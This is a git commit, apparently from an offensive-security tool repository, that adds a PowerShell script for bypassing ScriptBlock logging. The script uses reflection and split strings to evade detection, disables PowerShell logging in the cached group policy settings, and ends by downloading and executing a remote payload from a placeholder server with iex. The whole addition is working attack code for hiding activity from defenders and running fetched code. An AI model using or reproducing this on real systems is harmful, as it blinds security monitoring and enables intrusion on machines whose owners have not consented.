9342746428cae8178150e7672f729bd90e62c94d
lefayjey <lefayjey@lefayjey.fr>
2021-11-17 00:07:40 +0100

    Update 17112021

---
+++ windows/ScriptBlockLogBypass.ps1
@@ -0,0 +1,16 @@
+# ScriptBlock Logging Bypass
+# @cobbr_io
+
+$GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils')."GetFie`ld"('cachedGroupPolicySettings', 'N'+'onPublic,Static')
+If ($GroupPolicyField) {
+    $GroupPolicyCache = $GroupPolicyField.GetValue($null)
+    If ($GroupPolicyCache['ScriptB'+'lockLogging']) {
+        $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0
+        $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0
+    }
+    $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new()
+    $val.Add('EnableScriptB'+'lockLogging', 0)
+    $val.Add('EnableScriptB'+'lockInvocationLogging', 0)
+    $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging'] = $val
+}
+iex (New-Object Net.WebClient).downloadstring("https://myserver/mypayload.ps1")
